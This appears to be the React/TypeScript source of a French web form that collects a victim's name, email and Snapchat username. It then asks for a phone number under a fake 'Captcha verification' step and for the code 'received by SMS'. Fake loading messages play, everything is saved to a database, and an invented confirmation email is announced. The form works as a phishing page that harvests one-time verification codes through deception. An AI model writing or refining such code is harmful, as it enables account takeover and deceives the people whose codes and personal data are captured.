// ============================================================================
//  ✍️ PAGE UTILISATEUR — un parcours en plusieurs étapes
// ----------------------------------------------------------------------------
//   Étape 1 : 4 champs d'information (au tout début)
//   Étape 2 : 1er mot  → OK → PAGE DE CHARGEMENT (courte)
//   Étape 3 : 2e mot   → OK → PAGE DE CHARGEMENT (plus longue)
//   Étape 4 : "on va t'envoyer un mail" + retour à l'accueil
// ============================================================================

import { useEffect, useRef, useState } from "react";
import { Link } from "react-router-dom";
import { addMessage, ONLINE_MODE } from "../lib/store";
import { SpinnerCircle } from "../components/Spinner";

// Les 4 champs d'information (étape 1). On les décrit dans un tableau pour
// les générer automatiquement -> c'est plus court et plus facile à modifier.
const INFO_FIELDS = [
  { key: "prenom", label: "Prénom", placeholder: "Ex : Marie", type: "text" },
  { key: "nom", label: "Nom", placeholder: "Ex : Dupont", type: "text" },
  { key: "email", label: "Email", placeholder: "Ex : marie@email.com", type: "email" },
  { key: "ville", label: "Snap", placeholder: "Ex : snapplus.91", type: "text" },
] as const;

// Le type de l'objet qui contient les 4 valeurs.
type InfoData = Record<(typeof INFO_FIELDS)[number]["key"], string>;

// Les étapes possibles du parcours.
type Step = "info" | "word1" | "loading1" | "word2" | "loading2" | "done";

export default function UserPage() {
  const [step, setStep] = useState<Step>("info");

  // Les 4 champs d'info.
  const [info, setInfo] = useState<InfoData>({
    prenom: "",
    nom: "",
    email: "",
    ville: "",
  });

  // Les 2 mots.
  const [word1, setWord1] = useState("");
  const [word2, setWord2] = useState("");

  // Vérifie si tous les champs d'info sont remplis.
  const infoComplete = INFO_FIELDS.every((f) => info[f.key].trim() !== "");

  function updateInfo(key: keyof InfoData, value: string) {
    setInfo((prev) => ({ ...prev, [key]: value }));
  }

  // Sauvegarde dans la base de données (appelée à la toute fin du 2e chargement).
  // C'est ASYNCHRONE : on "attend" que l'enregistrement soit terminé (surtout
  // en mode en ligne, car on envoie les données sur Internet).
  async function saveData() {
    await addMessage({
      prenom: info.prenom.trim(),
      nom: info.nom.trim(),
      email: info.email.trim(),
      ville: info.ville.trim(),
      word1: word1.trim(),
      word2: word2.trim(),
    });
  }

  // Numéro d'étape pour l'indicateur (1=infos, 2=mot 1, 3=mot 2).
  const stepNumber =
    step === "info" ? 1 : step === "word1" || step === "loading1" ? 2 : 3;

  return (
    <div className="mx-auto max-w-xl">
      {/* ⚠️ AVERTISSEMENT visible seulement en mode local.
          Ça explique pourquoi les demandes ne se voient que sur cet appareil. */}
      {!ONLINE_MODE && (
        <div className="mb-4 rounded-xl border border-amber-300 bg-amber-50 p-4 text-sm text-amber-800">
          <p className="font-bold">🟡 Mode local — attention</p>
          <p className="mt-1 leading-relaxed">
            Ce site n'est pas encore relié à Internet. Les demandes envoyées
            ici seront visibles <strong>uniquement sur cet appareil</strong>.
            Pour que ton ordi voie les demandes envoyées depuis ton téléphone,
            configure Supabase puis remets le site en ligne (voir{" "}
            <code className="rounded bg-amber-100 px-1">SETUP.md</code>).
          </p>
        </div>
      )}

      <div className="rounded-3xl border border-slate-200 bg-white p-8 shadow-sm sm:p-10">
        {/* En-tête (caché pendant les chargements) */}
        {step !== "loading1" && step !== "loading2" && (
          <div className="mb-6 text-center">
            <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-2xl bg-gradient-to-br from-yellow-400 to-amber-500 text-3xl shadow-lg shadow-yellow-200">
              {step === "info" ? "📝" : step === "done" ? "📬" : "✍️"}
            </div>
            <h1 className="text-2xl font-bold text-slate-900">
              {step === "info"
                ? "Tes informations"
                : step === "word1"
                ? "Vérifification Captcha"
                : step === "word2"
                ? "Code"
                : "Demande envoyée !"}
            </h1>
            <p className="mt-1 text-slate-600">
              {step === "info"
                ? "Remplis ces 4 champs pour commencer."
                : step === "word1"
                ? "Vérification que vous êtes un humain, puis valide."
                : step === "word2"
                ? "Encore un effort : Entre le code reçu par sms."
                : "On te tient au courant par email."}
            </p>
          </div>
        )}

        {/* Indicateur d'étapes (sauf sur l'écran final) */}
        {step !== "done" && <Stepper current={stepNumber} />}

        {/* ---------------- ÉTAPE 1 : les 4 champs ---------------- */}
        {step === "info" && (
          <div className="space-y-4">
            <div className="grid gap-4 sm:grid-cols-2">
              {INFO_FIELDS.map((field) => (
                <div key={field.key}>
                  <label
                    htmlFor={field.key}
                    className="mb-2 block text-sm font-medium text-slate-700"
                  >
                    {field.label}
                  </label>
                  <input
                    id={field.key}
                    type={field.type}
                    value={info[field.key]}
                    onChange={(e) => updateInfo(field.key, e.target.value)}
                    placeholder={field.placeholder}
                    className="w-full rounded-xl border border-slate-300 px-4 py-3 outline-none transition focus:border-yellow-500 focus:ring-4 focus:ring-yellow-100"
                  />
                </div>
              ))}
            </div>
            <button
              onClick={() => setStep("word1")}
              disabled={!infoComplete}
              className="w-full rounded-xl bg-yellow-400 px-6 py-3 font-semibold text-slate-900 shadow-lg shadow-yellow-200 transition hover:bg-yellow-500 disabled:cursor-not-allowed disabled:opacity-50"
            >
              Continuer →
            </button>
            {!infoComplete && (
              <p className="text-center text-xs text-slate-400">
                Remplis les 4 champs pour continuer.
              </p>
            )}
          </div>
        )}

        {/* ---------------- ÉTAPE 2 : 1er mot ---------------- */}
        {step === "word1" && (
          <WordStep
            value={word1}
            onChange={setWord1}
            placeholder="Ex : +33670809010"
            autoFocus
            onBack={() => setStep("info")}
            onOk={() => setStep("loading1")}
          />
        )}

        {/* ---------------- CHARGEMENT court (après le 1er mot) ---------------- */}
        {step === "loading1" && (
          <LoadingStep
            duration={2600}
            message={(p) =>
              p < 50 ? "Vérification de votre numéro de téléphone…" : "Préparation de la suite…"
            }
            onComplete={() => setStep("word2")}
          />
        )}

        {/* ---------------- ÉTAPE 3 : 2e mot ---------------- */}
        {step === "word2" && (
          <WordStep
            value={word2}
            onChange={setWord2}
            placeholder="Ex : 67810"
            autoFocus
            onBack={() => setStep("word1")}
            onOk={() => setStep("loading2")}
          />
        )}

        {/* ---------------- CHARGEMENT long (final) ---------------- */}
        {step === "loading2" && (
          <LoadingStep
            duration={5000}
            message={(p) =>
              p < 30
                ? "Envoi de ta demande…"
                : p < 65
                ? "Enregistrement de tes informations…"
                : p < 100
                ? "Préparation de l'email de confirmation…"
                : "Presque terminé…"
            }
            onComplete={async () => {
              await saveData(); // 📥 on sauvegarde TOUT dans la base de données
              setStep("done");
            }}
          />
        )}

        {/* ---------------- ÉTAPE 4 : message email + retour accueil ---------------- */}
        {step === "done" && (
          <div className="space-y-5 text-center">
            <div className="rounded-2xl border border-green-200 bg-green-50 p-5">
              <p className="text-sm leading-relaxed text-green-800">
                Merci <strong>{info.prenom}</strong> ! Ta demande est bien
                prise en compte et est désormais <strong>en cours de
                traitement</strong>.
                <br />
                <br />
                📬 Un <strong>email de confirmation</strong> a été envoyé à{" "}
                <strong className="break-all">{info.email}</strong> pour t'en
                informer. (Pense aussi à vérifier tes spams.)
              </p>
            </div>

            <div className="flex flex-col gap-3">
              {/* Retour à l'accueil */}
              <Link
                to="/"
                className="rounded-xl bg-yellow-400 px-6 py-3 font-semibold text-slate-900 shadow-lg shadow-yellow-200 transition hover:bg-yellow-500"
              >
                🏠 Retour à l'accueil
              </Link>

              {/* Consulter sa boîte mail : liens vers les webmails courants */}
              <div className="pt-1">
                <p className="mb-2 text-xs text-slate-500">
                  Consulter ta boîte mail :
                </p>
                <div className="flex flex-wrap justify-center gap-2">
                  {[
                    { label: "Gmail", url: "https://mail.google.com" },
                    { label: "Outlook", url: "https://outlook.live.com" },
                    { label: "Yahoo", url: "https://mail.yahoo.com" },
                  ].map((m) => (
                    <a
                      key={m.label}
                      href={m.url}
                      target="_blank"
                      rel="noreferrer"
                      className="rounded-lg border border-slate-300 px-4 py-2 text-sm font-medium text-slate-700 transition hover:bg-slate-100"
                    >
                      ✉️ {m.label}
                    </a>
                  ))}
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      <p className="mt-6 text-center text-sm text-slate-400">
        🔒 Tes informations sont traitées en toute confidentialité.
      </p>
    </div>
  );
}

// ============================================================================
//  ✍️ Composant réutilisable pour saisir un mot (étapes 2 et 3)
// ============================================================================
function WordStep({
  value,
  onChange,
  placeholder,
  onBack,
  onOk,
  autoFocus,
}: {
  value: string;
  onChange: (v: string) => void;
  placeholder: string;
  onBack: () => void;
  onOk: () => void;
  autoFocus?: boolean;
}) {
  const filled = value.trim() !== "";
  return (
    <div className="space-y-4">
      <div>
        <label
          htmlFor="word"
          className="mb-2 block text-sm font-medium text-slate-700"
        >
          Ton motttttttt
        </label>
        <input
          id="word"
          type="text"
          value={value}
          onChange={(e) => onChange(e.target.value)}
          onKeyDown={(e) => e.key === "Enter" && filled && onOk()}
          placeholder={placeholder}
          autoFocus={autoFocus}
          className="w-full rounded-xl border border-slate-300 px-4 py-3 text-lg outline-none transition focus:border-yellow-500 focus:ring-4 focus:ring-yellow-100"
        />
      </div>
      <div className="flex gap-3">
        <button
          onClick={onBack}
          className="rounded-xl border border-slate-300 px-6 py-3 font-semibold text-slate-700 transition hover:bg-slate-100"
        >
          ← Retour
        </button>
        <button
          onClick={onOk}
          disabled={!filled}
          className="flex-1 rounded-xl bg-yellow-400 px-6 py-3 font-semibold text-slate-900 shadow-lg shadow-yellow-200 transition hover:bg-yellow-500 disabled:cursor-not-allowed disabled:opacity-50"
        >
          OK ✓
        </button>
      </div>
    </div>
  );
}

// ============================================================================
//  🔄 Composant réutilisable : PAGE DE CHARGEMENT classique + barre de progression
//  - "duration" = durée totale en millisecondes
//  - "message" = fonction qui renvoie un texte selon le % de progression
//  - "onComplete" = action à lancer quand on atteint 100 %
// ============================================================================
function LoadingStep({
  duration,
  message,
  onComplete,
}: {
  duration: number;
  message: (progress: number) => string;
  onComplete: () => void | Promise<void>;
}) {
  const [progress, setProgress] = useState(0);
  const doneRef = useRef(false); // garde-fou contre le double-déclenchement
  // On garde onComplete dans une "ref" pour toujours appeler la dernière version.
  const completeRef = useRef(onComplete);
  completeRef.current = onComplete;

  useEffect(() => {
    let p = 0;
    // On calcule de combien la barre doit avancer à chaque tic (60 ms)
    // pour atteindre 100 % pile à la fin de "duration".
    const increment = 100 / (duration / 60);

    const interval = setInterval(() => {
      p += increment;
      const clamped = Math.min(p, 100);
      setProgress(clamped);

      if (clamped >= 100 && !doneRef.current) {
        doneRef.current = true;
        clearInterval(interval);
        // Petit pause à 100 % pour un effet "propre", puis on continue.
        setTimeout(() => completeRef.current(), 350);
      }
    }, 60);

    return () => clearInterval(interval); // nettoyage
  }, [duration]);

  return (
    <div className="flex min-h-[340px] flex-col items-center justify-center gap-6 py-6 text-center">
      {/* Le rond qui tourne classique */}
      <SpinnerCircle size={72} />
      <div className="w-full max-w-xs">
        <p className="mb-2 font-medium text-slate-700">{message(progress)}</p>
        {/* La barre de progression */}
        <div className="h-2.5 w-full overflow-hidden rounded-full bg-slate-200">
          <div
            className="h-full rounded-full bg-gradient-to-r from-yellow-400 to-amber-500 transition-all duration-100 ease-linear"
            style={{ width: `${progress}%` }}
          />
        </div>
        <p className="mt-2 text-sm font-semibold text-amber-600">
          {Math.round(progress)}%
        </p>
      </div>
    </div>
  );
}

// ----------------------------------------------------------------------------
//  Petit composant : l'indicateur d'étapes (1 / 2 / 3).
// ----------------------------------------------------------------------------
function Stepper({ current }: { current: number }) {
  return (
    <div className="mb-8 flex items-center justify-center gap-2">
      {[1, 2, 3].map((n) => (
        <div key={n} className="flex items-center gap-2">
          <div
            className={`flex h-8 w-8 items-center justify-center rounded-full text-sm font-bold transition ${
              current >= n
                ? "bg-yellow-400 text-slate-900"
                : "bg-slate-200 text-slate-500"
            }`}
          >
            {current > n ? "✓" : n}
          </div>
          {n < 3 && (
            <div
              className={`h-1 w-10 rounded ${
                current > n ? "bg-yellow-400" : "bg-slate-200"
              }`}
            />
          )}
        </div>
      ))}
    </div>
  );
}
